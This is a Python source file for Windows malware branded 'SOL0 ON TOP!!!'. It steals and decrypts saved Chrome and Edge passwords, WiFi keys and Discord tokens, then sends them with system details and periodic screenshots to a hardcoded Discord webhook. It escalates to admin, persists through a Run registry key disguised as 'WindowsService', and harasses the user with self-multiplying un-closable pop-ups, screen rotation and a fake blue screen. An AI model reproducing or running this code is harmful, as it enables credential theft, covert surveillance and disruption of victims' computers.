import os
import sys
import subprocess
import ctypes
import io
import time
import json
import sqlite3
import shutil
import base64
import random
import threading
import tkinter as tk
from tkinter import messagebox
from datetime import datetime
from threading import Thread
import tempfile
import winreg
import platform
import re

# ==================== REQUEST ADMIN PERMISSION ====================
def request_admin():
    """Request administrator privileges"""
    if sys.platform == 'win32':
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            if not is_admin:
                print("[*] Requesting Administrator privileges...")
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, " ".join(sys.argv), None, 1
                )
                sys.exit()
            else:
                print("[+] Running with Administrator privileges")
        except Exception as e:
            print(f"[-] Admin request failed: {e}")

request_admin()
time.sleep(1)

# ==================== INSTALL MODULES ====================
def install_modules():
    modules = ['pyautogui', 'requests', 'pillow', 'browser_cookie3', 'pynput', 'pycryptodome', 'win32crypt', 'pywin32']
    for module in modules:
        try:
            if module == 'pillow':
                __import__('PIL')
            elif module == 'browser_cookie3':
                __import__('browser_cookie3')
            else:
                __import__(module)
        except ImportError:
            print(f"Installing {module}...")
            subprocess.run([sys.executable, '-m', 'pip', 'install', module, '--quiet'], capture_output=True)

install_modules()

# ==================== IMPORTS ====================
import pyautogui
import requests
from PIL import Image
import browser_cookie3
from pynput.mouse import Controller as MouseController, Listener as MouseListener
from pynput.keyboard import Controller as KeyboardController
from Crypto.Cipher import AES
import win32crypt
import win32api
import win32con

# Configuration
WEBHOOK_URL = "https://discord.com/api/webhooks/1502222196049711155/8QH1tz20HOu5EGBwebwBWSKCVqIBt1jE9ZRLuZlOdOFgX_pOR2t31WpjJpiXY7C9zj9-"
SCREENSHOT_INTERVAL = 120

mouse = MouseController()
keyboard = KeyboardController()

# ==================== MESSAGE BOX SPAM (SOL0 ON TOP) ====================
message_boxes = []
active_boxes = 0
box_lock = threading.Lock()

class DoublingMessageBox:
    """Message box that creates another when closed"""
    def __init__(self):
        self.window = None
        self.is_active = True
        
    def create(self):
        try:
            # Create custom dialog
            dialog = tk.Toplevel()
            dialog.title("⚠️ SYSTEM ALERT")
            dialog.geometry("450x220")
            dialog.configure(bg='#1e1e1e')
            dialog.resizable(False, False)
            
            # Center on screen randomly
            screen_width = dialog.winfo_screenwidth()
            screen_height = dialog.winfo_screenheight()
            x = random.randint(50, screen_width - 500)
            y = random.randint(50, screen_height - 270)
            dialog.geometry(f"450x220+{x}+{y}")
            
            # Make it stay on top
            dialog.attributes('-topmost', True)
            
            # Make it stay on top always
            def keep_on_top():
                while self.is_active:
                    try:
                        dialog.attributes('-topmost', True)
                        time.sleep(0.5)
                    except:
                        break
            Thread(target=keep_on_top, daemon=True).start()
            
            # Icon (warning)
            icon_frame = tk.Frame(dialog, bg='#1e1e1e')
            icon_frame.pack(pady=10)
            icon_label = tk.Label(icon_frame, text="⚠️", font=("Segoe UI", 48), fg="#ff4444", bg='#1e1e1e')
            icon_label.pack()
            
            # Message
            message_label = tk.Label(dialog, text="SOL0 ON TOP!!!", font=("Segoe UI", 28, "bold"), 
                                      fg="#ff4444", bg='#1e1e1e')
            message_label.pack(pady=5)
            
            # Sub message
            sub_label = tk.Label(dialog, text="This box cannot be closed", font=("Segoe UI", 10), 
                                 fg="#888888", bg='#1e1e1e')
            sub_label.pack()
            
            # Exit button that DOUBLES instead of closing
            def on_exit():
                # Create TWO more message boxes
                for _ in range(2):
                    new_box = DoublingMessageBox()
                    new_box.create()
                # Don't destroy the current one
                print("[!] User tried to close - Created 2 more boxes!")
            
            button_frame = tk.Frame(dialog, bg='#1e1e1e')
            button_frame.pack(pady=20)
            
            exit_button = tk.Button(button_frame, text="EXIT", command=on_exit, 
                                    font=("Segoe UI", 12, "bold"), bg="#ff4444", fg="white",
                                    activebackground="#cc0000", cursor="hand2", width=10)
            exit_button.pack()
            
            # Also trap the X button
            dialog.protocol("WM_DELETE_WINDOW", on_exit)
            
            # Store reference
            self.window = dialog
            
            # Start the window
            dialog.mainloop()
            
        except Exception as e:
            print(f"Message box error: {e}")
    
    def close(self):
        self.is_active = False
        if self.window:
            try:
                self.window.destroy()
            except:
                pass

def create_message_box():
    """Create a single message box"""
    box = DoublingMessageBox()
    message_boxes.append(box)
    Thread(target=box.create, daemon=True).start()
    time.sleep(0.2)

def spam_message_boxes_auto(count=15):
    """Auto spam message boxes"""
    print(f"[+] Creating {count} automatic message boxes...")
    for i in range(count):
        create_message_box()
        time.sleep(0.2)

def auto_message_box_loop():
    """Continuously create message boxes automatically"""
    box_count = 0
    while True:
        time.sleep(3)  # Create a new box every 3 seconds
        create_message_box()
        box_count += 1
        print(f"[+] Auto-created message box #{box_count}")

# ==================== SCREEN DRAWING (MOUSE DRAWS ON SCREEN) ====================
drawing = True  # AUTO START DRAWING
current_color = (255, 0, 0)  # Red
overlay_root = None
canvas = None

def create_transparent_overlay():
    """Create transparent overlay for drawing - AUTO"""
    global overlay_root, canvas
    
    overlay_root = tk.Tk()
    overlay_root.attributes('-fullscreen', True)
    overlay_root.attributes('-topmost', True)
    overlay_root.attributes('-transparentcolor', 'white')
    overlay_root.configure(bg='white')
    overlay_root.overrideredirect(True)
    
    canvas = tk.Canvas(overlay_root, bg='white', highlightthickness=0)
    canvas.pack(fill=tk.BOTH, expand=True)
    
    overlay_root.update()
    print("[+] Drawing overlay active - Mouse will draw on screen")
    return overlay_root

def auto_change_color():
    """Automatically change drawing color every few seconds"""
    colors = [
        (255, 0, 0),     # Red
        (0, 255, 0),     # Green
        (0, 0, 255),     # Blue
        (255, 255, 0),   # Yellow
        (255, 0, 255),   # Magenta
        (0, 255, 255),   # Cyan
        (255, 165, 0),   # Orange
        (128, 0, 128),   # Purple
        (255, 192, 203), # Pink
        (255, 255, 255), # White
    ]
    color_index = 0
    global current_color
    while True:
        time.sleep(5)  # Change color every 5 seconds
        color_index = (color_index + 1) % len(colors)
        current_color = colors[color_index]

def draw_on_screen(x, y):
    """Draw on screen at mouse position - AUTO"""
    if drawing and canvas:
        color_hex = f'#{current_color[0]:02x}{current_color[1]:02x}{current_color[2]:02x}'
        canvas.create_oval(x-5, y-5, x+5, y+5, fill=color_hex, outline=color_hex)
        overlay_root.update()

# ==================== MOUSE LISTENER (AUTO DRAW) ====================
def on_move(x, y):
    """Called when mouse moves - AUTO DRAW"""
    draw_on_screen(x, y)

# ==================== SCREEN ROTATION (REQUIRES ADMIN) ====================
def rotate_screen_upside_down():
    """Rotate screen 180 degrees - REQUIRES ADMIN"""
    try:
        print("[*] Rotating screen upside down...")
        devmode = win32api.EnumDisplaySettings(None, 0)
        devmode.DisplayOrientation = 2  # DMDO_180
        devmode.Fields = win32con.DM_DISPLAYORIENTATION
        
        result = win32api.ChangeDisplaySettings(devmode, 0)
        if result == 0:
            print("[+] Screen rotated 180 degrees!")
        else:
            print(f"[-] Rotation failed")
    except Exception as e:
        print(f"[-] Rotation error: {e}")

def screen_flicker_auto():
    """Auto screen flicker effect"""
    for _ in range(10):
        try:
            devmode = win32api.EnumDisplaySettings(None, 0)
            devmode.DisplayOrientation = 2
            win32api.ChangeDisplaySettings(devmode, 0)
            time.sleep(0.05)
            devmode.DisplayOrientation = 0
            win32api.ChangeDisplaySettings(devmode, 0)
            time.sleep(0.05)
        except:
            pass

# ==================== CREDENTIAL STEALING (DECRYPTED) ====================
def get_chrome_master_key():
    """Get Chrome master decryption key"""
    try:
        local_state_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Local State'
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except:
        return None

def decrypt_chrome_password(encrypted_password, master_key):
    """Decrypt Chrome password"""
    try:
        if not encrypted_password:
            return None
        
        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
            nonce = encrypted_password[3:15]
            ciphertext = encrypted_password[15:-16]
            tag = encrypted_password[-16:]
            
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode('utf-8', errors='ignore')
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
    except:
        return None

def get_all_passwords():
    """Extract ALL decrypted passwords"""
    passwords = []
    
    # Chrome passwords
    try:
        chrome_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
        if os.path.exists(chrome_path):
            temp_db = tempfile.NamedTemporaryFile(delete=False)
            shutil.copy2(chrome_path, temp_db.name)
            temp_db.close()
            
            master_key = get_chrome_master_key()
            
            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_pass = row[2]
                
                if username and encrypted_pass:
                    if master_key:
                        password = decrypt_chrome_password(encrypted_pass, master_key)
                        if password:
                            passwords.append(f"✅ Chrome: {url}\n   👤 {username}\n   🔐 `{password}`\n")
            conn.close()
            os.unlink(temp_db.name)
    except:
        pass
    
    # Edge passwords
    try:
        edge_path = os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
        if os.path.exists(edge_path):
            temp_db = tempfile.NamedTemporaryFile(delete=False)
            shutil.copy2(edge_path, temp_db.name)
            temp_db.close()
            
            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_pass = row[2]
                
                if username and encrypted_pass:
                    try:
                        password = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode('utf-8')
                        passwords.append(f"✅ Edge: {url}\n   👤 {username}\n   🔐 `{password}`\n")
                    except:
                        pass
            conn.close()
            os.unlink(temp_db.name)
    except:
        pass
    
    return passwords

def get_wifi_passwords():
    """Extract WiFi passwords"""
    wifi_list = []
    try:
        results = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
        profiles = [line.split(':')[1].strip() for line in results.stdout.split('\n') if 'All User Profile' in line]
        
        for profile in profiles:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'Key Content' in line:
                    password = line.split(':')[1].strip()
                    wifi_list.append(f"✅ WiFi: {profile}\n   🔐 `{password}`\n")
                    break
    except:
        pass
    return wifi_list

def get_discord_tokens():
    """Extract Discord tokens"""
    tokens = []
    paths = [
        os.path.expanduser('~') + r'\AppData\Roaming\Discord\Local Storage\leveldb',
        os.path.expanduser('~') + r'\AppData\Roaming\discordcanary\Local Storage\leveldb',
    ]
    
    token_pattern = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
    
    for path in paths:
        try:
            if os.path.exists(path):
                for file in os.listdir(path):
                    if file.endswith('.log') or file.endswith('.ldb'):
                        with open(os.path.join(path, file), 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            tokens.extend(token_pattern.findall(content))
        except:
            pass
    
    return list(set(tokens))

def get_system_info():
    """Get system information"""
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
    except:
        ip = 'Unknown'
    
    return {
        'computer': os.environ.get('COMPUTERNAME', 'Unknown'),
        'user': os.getenv('USERNAME', 'Unknown'),
        'os': platform.system() + ' ' + platform.release(),
        'ip': ip
    }

def send_to_webhook(content, is_file=False, file_bytes=None, filename=None):
    """Send to Discord webhook"""
    try:
        if is_file and file_bytes:
            files = {'file': (filename, file_bytes, 'image/jpeg')}
            requests.post(WEBHOOK_URL, files=files, timeout=30)
        else:
            if len(content) > 1900:
                for i in range(0, len(content), 1900):
                    requests.post(WEBHOOK_URL, json={'content': content[i:i+1900]}, timeout=30)
            else:
                requests.post(WEBHOOK_URL, json={'content': content}, timeout=30)
        return True
    except:
        return False

def collect_and_send_data():
    """Collect all data and send to webhook"""
    sys_info = get_system_info()
    
    message = f"**[🔴 VICTIM SYSTEM - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}**\n"
    message += f"💻 PC: {sys_info['computer']}\n"
    message += f"👤 User: {sys_info['user']}\n"
    message += f"🖥️ OS: {sys_info['os']}\n"
    message += f"🌐 IP: {sys_info['ip']}\n"
    message += f"{'='*60}\n\n"
    
    # Passwords
    message += "**🔑 BROWSER PASSWORDS (DECRYPTED):**\n"
    for pwd in get_all_passwords():
        message += pwd
    if not get_all_passwords():
        message += "No passwords found\n"
    message += "\n"
    
    # WiFi
    message += "**📡 WIFI PASSWORDS:**\n"
    for wifi in get_wifi_passwords():
        message += wifi
    if not get_wifi_passwords():
        message += "No WiFi passwords found\n"
    message += "\n"
    
    # Discord Tokens
    message += "**🎮 DISCORD TOKENS:**\n"
    for token in get_discord_tokens()[:5]:
        message += f"✅ `{token}`\n"
    if not get_discord_tokens():
        message += "No Discord tokens found\n"
    
    send_to_webhook(message)
    print("[+] Victim data sent to webhook!")

# ==================== SCREENSHOT WORKER ====================
def screenshot_worker():
    """Take screenshots every 2 minutes - AUTO"""
    while True:
        try:
            screenshot = pyautogui.screenshot()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='JPEG', quality=60)
            img_bytes.seek(0)
            
            sys_info = get_system_info()
            filename = f"ss_{sys_info['computer']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            send_to_webhook(None, True, img_bytes.getvalue(), filename)
            print(f"[+] Screenshot sent: {filename}")
            
            time.sleep(SCREENSHOT_INTERVAL)
        except:
            time.sleep(5)

# ==================== MOUSE JITTER & TYPE SOLO ====================
def mouse_jitter_auto():
    """Auto mouse jitter - runs once"""
    for _ in range(20):
        x, y = mouse.position
        mouse.position = (x + random.randint(-3, 3), y + random.randint(-3, 3))
        time.sleep(0.05)

def type_solo_auto():
    """Auto type 'SOL0 ON TOP!!!' on screen"""
    time.sleep(2)
    keyboard.type('SOL0 ON TOP!!!')
    keyboard.press('\n')
    keyboard.release('\n')

# ==================== FAKE BSOD ====================
def fake_bsod_auto():
    """Create fake BSOD effect - AUTO after 20 seconds"""
    time.sleep(20)
    try:
        bsod = tk.Tk()
        bsod.attributes('-fullscreen', True)
        bsod.configure(bg='#0000AA')
        bsod.attributes('-topmost', True)
        
        label = tk.Label(bsod, text=":(", font=("Consolas", 72), fg="white", bg='#0000AA')
        label.pack(pady=100)
        
        text = tk.Label(bsod, text="SOL0 ON TOP!!! - Your PC ran into a problem\n\nStop code: CRITICAL_PROCESS_DIED", 
                       font=("Consolas", 16), fg="white", bg='#0000AA')
        text.pack()
        
        # Progress bar
        progress = tk.Canvas(bsod, width=400, height=20, bg='#0000AA', highlightthickness=0)
        progress.pack(pady=50)
        progress.create_rectangle(0, 0, 0, 20, fill='white', tags='progress')
        
        def update_progress():
            for i in range(101):
                progress.coords('progress', 0, 0, (400 * i / 100), 20)
                bsod.update()
                time.sleep(0.05)
            bsod.destroy()
        
        Thread(target=update_progress, daemon=True).start()
        bsod.mainloop()
    except:
        pass

# ==================== ADD TO STARTUP ====================
def add_to_startup():
    """Add to Windows startup - AUTO"""
    try:
        script_path = os.path.abspath(sys.argv[0])
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as registry_key:
            winreg.SetValueEx(registry_key, "WindowsService", 0, winreg.REG_SZ, 
                            f'"{sys.executable}" "{script_path}"')
        print("[+] Added to Windows startup")
    except:
        pass

# ==================== MAIN - FULLY AUTOMATIC ====================
def main():
    print("="*60)
    print("🔥 SOL0 ON TOP!!! - FULLY AUTOMATIC")
    print("="*60)
    print("[+] Administrator mode: ACTIVE")
    print("[+] NO KEYS NEEDED - Everything runs automatically")
    print("="*60)
    
    # Add to startup
    add_to_startup()
    time.sleep(2)
    
    # Collect and send credentials to webhook
    print("\n[+] Collecting victim data...")
    collect_and_send_data()
    
    # Start drawing overlay (AUTO)
    print("\n[+] Activating screen drawing overlay...")
    overlay_thread = Thread(target=create_transparent_overlay, daemon=True)
    overlay_thread.start()
    time.sleep(1)
    
    # Start mouse listener for drawing (AUTO)
    mouse_listener = MouseListener(on_move=on_move)
    mouse_listener.daemon = True
    mouse_listener.start()
    print("[+] Mouse drawing active - Every mouse move draws on screen!")
    
    # Auto change colors every 5 seconds
    color_thread = Thread(target=auto_change_color, daemon=True)
    color_thread.start()
    print("[+] Auto color change every 5 seconds")
    
    # Rotate screen upside down (AUTO)
    print("\n[+] Rotating screen upside down...")
    rotate_screen_upside_down()
    
    # Screen flicker effect (AUTO)
    print("[+] Screen flicker effect...")
    Thread(target=screen_flicker_auto, daemon=True).start()
    
    # Mouse jitter (AUTO)
    print("[+] Mouse jitter effect...")
    Thread(target=mouse_jitter_auto, daemon=True).start()
    
    # Type SOL0 ON TOP!!! (AUTO)
    print("[+] Typing 'SOL0 ON TOP!!!'...")
    Thread(target=type_solo_auto, daemon=True).start()
    
    # AUTO MESSAGE BOX SPAM - Continuous
    print("\n[+] Starting automatic message box spam...")
    print("    → Boxes say 'SOL0 ON TOP!!!'")
    print("    → Clicking EXIT creates 2 MORE boxes")
    print("    → New box appears every 3 seconds")
    
    # Create initial 10 message boxes
    spam_message_boxes_auto(10)
    
    # Start continuous message box creation (every 3 seconds)
    auto_box_thread = Thread(target=auto_message_box_loop, daemon=True)
    auto_box_thread.start()
    
    # BSOD after 20 seconds (AUTO)
    print("\n[+] Fake BSOD will appear in 20 seconds...")
    Thread(target=fake_bsod_auto, daemon=True).start()
    
    # Screenshots every 2 minutes (AUTO)
    print("\n[+] Screenshot worker active (every 2 minutes)")
    print("="*60)
    print("⚡ ALL FEATURES ACTIVE - NO INTERACTION NEEDED ⚡")
    print("="*60)
    
    # Keep running
    screenshot_worker()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(10)
